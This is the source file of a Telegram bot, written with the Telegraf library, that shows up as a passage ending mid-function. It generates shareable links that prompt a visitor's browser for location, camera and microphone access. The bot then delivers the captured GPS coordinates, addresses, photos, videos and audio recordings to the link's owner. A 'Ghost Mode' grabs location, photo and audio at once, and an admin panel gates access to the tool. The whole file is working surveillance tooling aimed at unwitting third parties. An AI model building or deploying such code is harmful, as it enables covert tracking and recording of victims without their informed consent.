/**
 * ============================================
 * Telegram Bot Module
 * ============================================
 * Main bot logic with command and message handlers.
 */

const { Telegraf } = require('telegraf');
const config = require('./config');
const logger = require('./logger');
const api = require('./api');
const { 
    mainMenuKeyboard,
    adminMenuKeyboard,
    previewMenuKeyboard,
    getPermissionTypeFromButton, 
    sessionActionsKeyboard,
    adminPanelKeyboard,
    accessRequestsKeyboard,
    userListKeyboard,
    userDetailKeyboard
} = require('./keyboard');

// Create bot instance
const bot = new Telegraf(config.botToken);

// Store active sessions for status updates (in-memory)
const activeSessions = new Map();

// ============================================
// Helper Functions
// ============================================

/**
 * Check if user is admin
 */
const isAdmin = (telegramId) => {
    return telegramId === config.admin.telegramId;
};

/**
 * Get appropriate menu for user
 */
const getMenuForUser = async (telegramId) => {
    if (isAdmin(telegramId)) {
        return adminMenuKeyboard;
    }
    
    try {
        const result = await api.checkUserStatus(telegramId);
        if (result.success && result.status.isApproved) {
            return mainMenuKeyboard;
        }
    } catch (error) {
        logger.error('Failed to check user status', { error: error.message });
    }
    
    return previewMenuKeyboard;
};

// ============================================
// Middleware
// ============================================

// Log all updates
bot.use((ctx, next) => {
    const user = ctx.from;
    logger.debug('Update received', {
        type: ctx.updateType,
        userId: user?.id,
        username: user?.username
    });
    return next();
});

// ============================================
// Command Handlers
// ============================================

/**
 * /start command - Initialize bot and show appropriate menu
 */
bot.start(async (ctx) => {
    const user = ctx.from;
    
    logger.info('User started bot', {
        userId: user.id,
        username: user.username
    });
    
    // Check user status
    const menu = await getMenuForUser(user.id);
    
    if (isAdmin(user.id)) {
        // Admin welcome
        await ctx.reply(
            `👑 Welcome Admin, ${user.first_name || 'Boss'}!\n\n` +
            `You have full access to all features.\n\n` +
            `I can help you create permission sessions for:\n` +
            `📍 Location tracking\n` +
            `📷 Photo capture\n` +
            `🎥 Video recording\n` +
            `🎤 Audio recording\n` +
            `👻 Ghost Mode (all at once)\n\n` +
            `Use 🔐 Admin Panel to manage users and access requests.`,
            menu
        );
    } else {
        // Check if approved
        try {
            const result = await api.checkUserStatus(user.id);
            
            if (result.success && result.status.isApproved) {
                // Approved user
                await ctx.reply(
                    `👋 Welcome back, ${user.first_name || 'User'}!\n\n` +
                    `I can help you create permission sessions for:\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Select an option from the menu below to get started.`,
                    menu
                );
            } else if (result.success && result.status.accessRequested) {
                // Access already requested
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `⏳ Your access request is pending.\n` +
                    `Please wait for admin approval.\n\n` +
                    `Contact ${config.admin.contact} for faster response.`,
                    menu
                );
            } else {
                // Not approved - show preview
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `🔒 This bot requires approval to use.\n\n` +
                    `*Preview of features:*\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Press 🔑 *Request Access* to request permission.\n` +
                    `Or contact: ${config.admin.contact}`,
                    { parse_mode: 'Markdown', ...menu }
                );
            }
        } catch (error) {
            logger.error('Error checking user status', { error: error.message });
            await ctx.reply(
                `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                `🔒 This bot requires approval to use.\n` +
                `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
                { parse_mode: 'Markdown', ...menu }
            );
        }
    }
});

/**
 * /help command - Show help message
 */
bot.help(async (ctx) => {
    await ctx.reply(
        `ℹ️ *How to use this bot:*\n\n` +
        `1️⃣ Select a permission type from the menu\n` +
        `2️⃣ Receive a unique link\n` +
        `3️⃣ Open the link in your browser\n` +
        `4️⃣ Grant permissions when prompted\n` +
        `5️⃣ Data will be captured and stored\n\n` +
        `*Available permissions:*\n` +
        `📍 Location - Track GPS coordinates\n` +
        `📷 Single Photo - Capture one photo\n` +
        `📸 Continuous Photo - Take photos periodically\n` +
        `🎥 Video - Record video\n` +
        `🎤 Microphone - Record audio\n` +
        `👻 Ghost Mode - Capture location, photo & audio together\n\n` +
        `*Commands:*\n` +
        `/start - Show main menu\n` +
        `/help - Show this help message\n` +
        `/status - Check API status`,
        { parse_mode: 'Markdown' }
    );
});

/**
 * /status command - Check API health
 */
bot.command('status', async (ctx) => {
    const isHealthy = await api.checkHealth();
    
    await ctx.reply(
        isHealthy
            ? '✅ Backend API is online and healthy'
            : '❌ Backend API is offline or unhealthy'
    );
});

// ============================================
// Message Handlers
// ============================================

/**
 * Handle all text button presses
 */
bot.on('text', async (ctx) => {
    const buttonText = ctx.message.text;
    const user = ctx.from;
    
    // Handle Admin Panel button
    if (buttonText === '🔐 Admin Panel') {
        if (!isAdmin(user.id)) {
            await ctx.reply('❌ Admin access required.');
            return;
        }
        
        await ctx.reply(
            '🔐 *Admin Panel*\n\n' +
            'Select an option below:',
            { parse_mode: 'Markdown', ...adminPanelKeyboard }
        );
        return;
    }
    
    // Handle View All Results button
    if (buttonText === '📊 View All Results') {
        await ctx.sendChatAction('typing');
        
        try {
            const result = await api.getAllCapturedData(user.id);
            
            if (!result.success || !result.data || result.data.length === 0) {
                await ctx.reply('📭 No captured data yet.\n\nUse the menu to generate capture links and share them.');
                return;
            }
            
            const data = result.data;
            
            // Categorize data
            const locations = data.filter(d => d.media_type === 'location');
            const photos = data.filter(d => d.media_type === 'photo');
            const videos = data.filter(d => d.media_type === 'video');
            const audios = data.filter(d => d.media_type === 'audio');
            
            // Summary message with view all buttons
            let msg = `📊 *ALL CAPTURED DATA*\n\n`;
            msg += `📍 Locations: ${locations.length}\n`;
            msg += `📷 Photos: ${photos.length}\n`;
            msg += `🎥 Videos: ${videos.length}\n`;
            msg += `🎤 Audio: ${audios.length}\n`;
            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
            msg += `\nTap a button below to view all items:`;
            
            // Build inline keyboard with available categories
            const buttons = [];
            if (locations.length > 0) buttons.push([Markup.button.callback(`📍 View All Locations (${locations.length})`, 'viewall_locations')]);
            if (photos.length > 0) buttons.push([Markup.button.callback(`📷 View All Photos (${photos.length})`, 'viewall_photos')]);
            if (videos.length > 0) buttons.push([Markup.button.callback(`🎥 View All Videos (${videos.length})`, 'viewall_videos')]);
            if (audios.length > 0) buttons.push([Markup.button.callback(`🎤 View All Audio (${audios.length})`, 'viewall_audio')]);
            
            await ctx.reply(msg, { 
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard(buttons)
            });
            
        } catch (error) {
            logger.error('Failed to get all results', { error: error.message });
            await ctx.reply('❌ Failed to fetch results: ' + error.message);
        }
        return;
    }
    
    // Handle Request Access button
    if (buttonText === '🔑 Request Access') {
        try {
            // Check if already requested
            const statusResult = await api.checkUserStatus(user.id);
            
            if (statusResult.success && statusResult.status.isApproved) {
                const menu = await getMenuForUser(user.id);
                await ctx.reply(
                    '✅ You already have access! Use the menu to create sessions.',
                    menu
                );
                return;
            }
            
            if (statusResult.success && statusResult.status.accessRequested) {
                await ctx.reply(
                    '⏳ You have already requested access.\n' +
                    `Please wait for admin approval or contact ${config.admin.contact}`
                );
                return;
            }
            
            // Request access
            await api.requestAccess(user);
            
            await ctx.reply(
                '✅ *Access Request Sent!*\n\n' +
                'Your request has been submitted.\n' +
                `An admin will review it soon.\n\n` +
                `For faster response, contact: ${config.admin.contact}`,
                { parse_mode: 'Markdown' }
            );
            
            // Notify admin
            try {
                await ctx.telegram.sendMessage(
                    config.admin.telegramId,
                    `🔔 *New Access Request*\n\n` +
                    `User: ${user.first_name || ''} ${user.last_name || ''}\n` +
                    `Username: @${user.username || 'N/A'}\n` +
                    `ID: \`${user.id}\`\n\n` +
                    `Use Admin Panel to approve or deny.`,
                    { parse_mode: 'Markdown' }
                );
            } catch (notifyErr) {
                logger.error('Failed to notify admin', { error: notifyErr.message });
            }
            
            logger.info('Access requested', { userId: user.id, username: user.username });
            
        } catch (error) {
            logger.error('Failed to request access', { error: error.message });
            await ctx.reply('❌ Failed to submit request. Please try again later.');
        }
        return;
    }
    
    // Handle Preview buttons (for unapproved users)
    if (buttonText.includes('(Preview)')) {
        await ctx.reply(
            '🔒 *Feature Locked*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Check if it's a permission button
    const permissionType = getPermissionTypeFromButton(buttonText);
    
    if (!permissionType) {
        await ctx.reply(
            '🤔 I don\'t understand that message.\n' +
            'Please use the menu buttons below or type /help for assistance.'
        );
        return;
    }
    
    // Check if user is approved
    const userIsAdmin = isAdmin(user.id);
    let userIsApproved = false;
    
    if (!userIsAdmin) {
        try {
            const statusResult = await api.checkUserStatus(user.id);
            userIsApproved = statusResult.success && statusResult.status.isApproved;
        } catch (error) {
            logger.error('Failed to check approval status', { error: error.message });
        }
    }
    
    if (!userIsAdmin && !userIsApproved) {
        await ctx.reply(
            '🔒 *Access Denied*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const permissionConfig = config.permissions[permissionType];
    
    logger.info('Permission requested', {
        userId: user.id,
        permissionType
    });
    
    // Send typing action for instant feedback
    await ctx.sendChatAction('typing');
    
    try {
        // Map permission types to URL-friendly types
        const typeMap = {
            'location': 'location',
            'single_photo': 'photo',
            'continuous_photo': 'photo',
            'video': 'video',
            'microphone': 'mic',
            'ghost': 'mic'  // Ghost mode uses mic URL but captures all
        };
        
        const urlType = typeMap[permissionType] || permissionType;
        
        // Generate user-based link (same user always gets same link)
        const webLink = `${config.webClient.baseUrl}/${urlType}/${user.id}`;
        
        // Register user with server for notifications
        try {
            await api.registerUserCapture(user, permissionType);
        } catch (regError) {
            logger.warn('Failed to register user for capture', { error: regError.message });
        }
        
        // Send link immediately
        await ctx.reply(
            `✅ *Link Ready!*\n\n` +
            `*Type:* ${permissionConfig.label}\n` +
            `*Description:* ${permissionConfig.description}\n\n` +
            `🔗 *Your permanent link:*\n` +
            `${webLink}\n\n` +
            `📌 *This is YOUR personal link - same link every time!*\n\n` +
            `_Permission will be requested instantly when opened._`,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }
        );
        
        logger.info('User link generated', {
            userId: user.id,
            permissionType,
            webLink
        });
        
    } catch (error) {
        logger.error('Failed to create session', {
            userId: user.id,
            error: error.message
        });
        
        await ctx.reply(
            '❌ Failed to create session.\n\n' +
            'Please make sure the backend server is running and try again.\n' +
            'Error: ' + error.message
        );
    }
});

// ============================================
// Callback Query Handlers
// ============================================

/**
 * Handle View All Locations
 */
bot.action('viewall_locations', async (ctx) => {
    await ctx.answerCbQuery('Loading all locations...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch locations');
            return;
        }
        
        const locations = result.data.filter(d => d.media_type === 'location');
        
        if (locations.length === 0) {
            await ctx.reply('📍 No locations captured yet.');
            return;
        }
        
        await ctx.reply(`📍 *ALL LOCATIONS (${locations.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send in batches of 10 to avoid flooding
        for (let i = 0; i < locations.length; i++) {
            const loc = locations[i];
            const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
            
            let locMsg = `📍 *Location ${i + 1}*\n`;
            locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n`;
            
            if (metadata.latitude && metadata.longitude) {
                locMsg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
                if (metadata.accuracy) locMsg += `📏 Accuracy: ${Math.round(metadata.accuracy)}m\n`;
                locMsg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
            }
            
            await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
            
            // Small delay to avoid rate limiting
            if (i > 0 && i % 10 === 0) {
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        await ctx.reply(`✅ Showing all ${locations.length} location(s)`);
        
    } catch (error) {
        logger.error('Failed to load all locations', { error: error.message });
        await ctx.reply('❌ Error loading locations: ' + error.message);
    }
});

/**
 * Handle View All Photos
 */
bot.action('viewall_photos', async (ctx) => {
    await ctx.answerCbQuery('Loading all photos...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch photos');
            return;
        }
        
        const photos = result.data.filter(d => d.media_type === 'photo');
        
        if (photos.length === 0) {
            await ctx.reply('📷 No photos captured yet.');
            return;
        }
        
        await ctx.reply(`📷 *ALL PHOTOS (${photos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each photo
        for (let i = 0; i < photos.length; i++) {
            const photo = photos[i];
            const filePath = photo.file_path;
            const caption = `📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}`;
            
            try {
                // Try to send the actual photo file
                const fs = require('fs');
                const path = require('path');
                const fullPath = path.join(__dirname, '..', 'server', filePath);
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithPhoto({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n📁 File: ${filePath}`);
                }
            } catch (photoErr) {
                await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay
            if (i > 0 && i % 5 === 0) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        
        await ctx.reply(`✅ Showing all ${photos.length} photo(s)`);
        
    } catch (error) {
        logger.error('Failed to load all photos', { error: error.message });
        await ctx.reply('❌ Error loading photos: ' + error.message);
    }
});

/**
 * Handle View All Videos
 */
bot.action('viewall_videos', async (ctx) => {
    await ctx.answerCbQuery('Loading all videos...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch videos');
            return;
        }
        
        const videos = result.data.filter(d => d.media_type === 'video');
        
        if (videos.length === 0) {
            await ctx.reply('🎥 No videos captured yet.');
            return;
        }
        
        await ctx.reply(`🎥 *ALL VIDEOS (${videos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each video
        for (let i = 0; i < videos.length; i++) {
            const video = videos[i];
            const filePath = video.file_path;
            const sizeMB = video.file_size ? (video.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
            
            try {
                const fs = require('fs');
                const path = require('path');
                const fullPath = path.join(__dirname, '..', 'server', filePath);
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithVideo({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Stored on server`);
                }
            } catch (videoErr) {
                await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay for videos
            if (i > 0) {
                await new Promise(r => setTimeout(r, 2000));
            }
        }
        
        await ctx.reply(`✅ Showing all ${videos.length} video(s)`);
        
    } catch (error) {
        logger.error('Failed to load all videos', { error: error.message });
        await ctx.reply('❌ Error loading videos: ' + error.message);
    }
});

/**
 * Handle View All Audio
 */
bot.action('viewall_audio', async (ctx) => {
    await ctx.answerCbQuery('Loading all audio...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch audio');
            return;
        }
        
        const audios = result.data.filter(d => d.media_type === 'audio');
        
        if (audios.length === 0) {
            await ctx.reply('🎤 No audio captured yet.');
            return;
        }
        
        await ctx.reply(`🎤 *ALL AUDIO (${audios.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each audio
        for (let i = 0; i < audios.length; i++) {
            const audio = audios[i];
            const filePath = audio.file_path;
            const sizeMB = audio.file_size ? (audio.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
            
            try {
                const fs = require('fs');
                const path = require('path');
                const fullPath = path.join(__dirname, '..', 'server', filePath);
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithAudio({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Stored on server`);
                }
            } catch (audioErr) {
                await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay
            if (i > 0) {
                await new Promise(r => setTimeout(r, 1500));
            }
        }
        
        await ctx.reply(`✅ Showing all ${audios.length} audio recording(s)`);
        
    } catch (error) {
        logger.error('Failed to load all audio', { error: error.message });
        await ctx.reply('❌ Error loading audio: ' + error.message);
    }
});

/**
 * Handle session status check
 */
bot.action(/^status_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery(); // Instant feedback
    
    try {
        const result = await api.getSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Session not found');
        }
        
        const { session } = result;
        
        const statusEmoji = {
            created: '🟡',
            active: '🟢',
            ended: '⚫',
            expired: '🔴'
        };
        
        let mediaInfo = '';
        if (session.mediaCounts && Object.keys(session.mediaCounts).length > 0) {
            mediaInfo = '\n\n📊 <b>Data Received:</b>\n';
            for (const [type, count] of Object.entries(session.mediaCounts)) {
                mediaInfo += `  • ${type}: ${count}\n`;
            }
        }
        
        // Build status message
        let statusMessage = 
            `📋 <b>Session Status</b>\n\n` +
            `<b>Status:</b> ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
            `<b>Type:</b> ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
            `<b>Created:</b> ${new Date(session.createdAt).toLocaleString()}\n` +
            `<b>Expires:</b> ${new Date(session.expiresAt).toLocaleString()}` +
            (session.activatedAt ? `\n<b>Activated:</b> ${new Date(session.activatedAt).toLocaleString()}` : '') +
            (session.endedAt ? `\n<b>Ended:</b> ${new Date(session.endedAt).toLocaleString()}` : '') +
            mediaInfo;
        
        await ctx.reply(statusMessage, { parse_mode: 'HTML' });
        
        // If it's a location session, also show the last location with full details
        if (session.permissionType === 'location' && session.mediaCounts?.location > 0) {
            try {
                const locationsResult = await api.getSessionLocations(sessionId);
                
                if (locationsResult.success && locationsResult.locations.length > 0) {
                    // Get the most recent location
                    const latestLocation = locationsResult.locations[locationsResult.locations.length - 1];
                    const loc = latestLocation.data;
                    
                    let locationMessage = `\n📍 <b>LATEST LOCATION</b>\n\n`;
                    
                    // Address
                    if (loc.address) {
                        locationMessage += `📌 <b>Address:</b>\n${loc.address.formatted || loc.address.displayName}\n\n`;
                        
                        if (loc.address.street) locationMessage += `🏠 Street: ${loc.address.street}\n`;
                        if (loc.address.neighborhood) locationMessage += `🏘️ Area: ${loc.address.neighborhood}\n`;
                        if (loc.address.city) locationMessage += `🌆 City: ${loc.address.city}\n`;
                        if (loc.address.state) locationMessage += `🗺️ State: ${loc.address.state}\n`;
                        if (loc.address.country) locationMessage += `🌍 Country: ${loc.address.country}\n`;
                        if (loc.address.postalCode) locationMessage += `📮 Postal: ${loc.address.postalCode}\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Coordinates
                    if (loc.coordinates) {
                        locationMessage += `🎯 <b>Coordinates:</b>\n`;
                        locationMessage += `├ Lat: <code>${loc.coordinates.latitude?.toFixed(6)}</code>\n`;
                        locationMessage += `├ Lng: <code>${loc.coordinates.longitude?.toFixed(6)}</code>\n`;
                        if (loc.coordinates.accuracy) locationMessage += `├ Accuracy: ${loc.coordinates.accuracy.toFixed(1)}m\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Timestamp
                    locationMessage += `🕐 <b>Captured:</b> ${new Date(latestLocation.timestamp).toLocaleString()}\n\n`;
                    
                    // Maps links
                    if (loc.maps) {
                        locationMessage += `🗺️ <b>View on Maps:</b>\n`;
                        locationMessage += `<a href="${loc.maps.googleMaps}">📍 Open in Google Maps</a>\n`;
                        locationMessage += `<a href="${loc.maps.googleMapsDirections}">🧭 Get Directions</a>`;
                    }
                    
                    await ctx.reply(locationMessage, { 
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    });
                }
            } catch (locError) {
                logger.error('Failed to get locations', { error: locError.message });
            }
        }
        
    } catch (error) {
        logger.error('Failed to get session status', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get session status: ' + error.message);
    }
});

/**
 * Handle view results request
 */
bot.action(/^results_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured yet for this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION RESULTS</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File available on server: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { 
                            caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}`,
                            duration: video.duration
                        }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File available on server: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { 
                            caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}`,
                            duration: audio.duration
                        }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File available on server: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Results sent to user', { sessionId, counts });
        
    } catch (error) {
        logger.error('Failed to get session results', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get results: ' + error.message);
    }
});

/**
 * Handle session end request
 */
bot.action(/^end_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.endSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to end session');
        }
        
        // Remove from active sessions
        activeSessions.delete(sessionId);
        
        await ctx.reply(
            '✅ Session ended successfully.\n\n' +
            'No more data will be accepted for this session.'
        );
        
        logger.info('Session ended by user', { sessionId });
        
    } catch (error) {
        logger.error('Failed to end session', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to end session: ' + error.message);
    }
});

// ============================================
// Admin Callback Handlers
// ============================================

/**
 * Handle admin panel button
 */
bot.action('admin_panel', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        '🔐 *Admin Panel*\n\n' +
        'Select an option below:',
        { parse_mode: 'Markdown', ...adminPanelKeyboard }
    );
});

/**
 * Handle view access requests
 */
bot.action('admin_requests', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getPendingRequests(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get requests');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '📋 *Access Requests*\n\n' +
                '✅ No pending requests!',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `📋 *Access Requests* (${result.count})\n\n`;
        result.requests.forEach((req, i) => {
            msg += `${i + 1}. ${req.firstName || 'Unknown'} ${req.lastName || ''}\n`;
            msg += `   @${req.username || 'N/A'} | ID: \`${req.telegramId}\`\n\n`;
        });
        msg += `\n_Tap ✅ to approve or ❌ to deny_`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...accessRequestsKeyboard(result.requests)
        });
        
    } catch (error) {
        logger.error('Failed to get access requests', { error: error.message });
        await ctx.reply('❌ Failed to load requests: ' + error.message);
    }
});

/**
 * Handle view all users
 */
bot.action('admin_users', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllUsers(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get users');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '👥 *All Users*\n\n' +
                'No users registered yet.',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `👥 *All Users* (${result.count})\n\n`;
        msg += `_Tap on a user to view details_\n\n`;
        msg += `✅ = Approved | ❌ = Not Approved`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...userListKeyboard(result.users)
        });
        
    } catch (error) {
        logger.error('Failed to get all users', { error: error.message });
        await ctx.reply('❌ Failed to load users: ' + error.message);
    }
});

/**
 * Handle view specific user data
 */
bot.action(/^viewuser_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getUserData(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get user data');
        }
        
        const { user, sessions } = result.data;
        
        // Escape HTML special characters
        const escapeHtml = (str) => {
            if (!str) return '';
            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };
        
        const firstName = escapeHtml(user.firstName || '');
        const lastName = escapeHtml(user.lastName || '');
        const username = escapeHtml(user.username || 'N/A');
        
        let msg = `👤 <b>User Details</b>\n\n`;
        msg += `<b>Name:</b> ${firstName} ${lastName}\n`;
        msg += `<b>Username:</b> @${username}\n`;
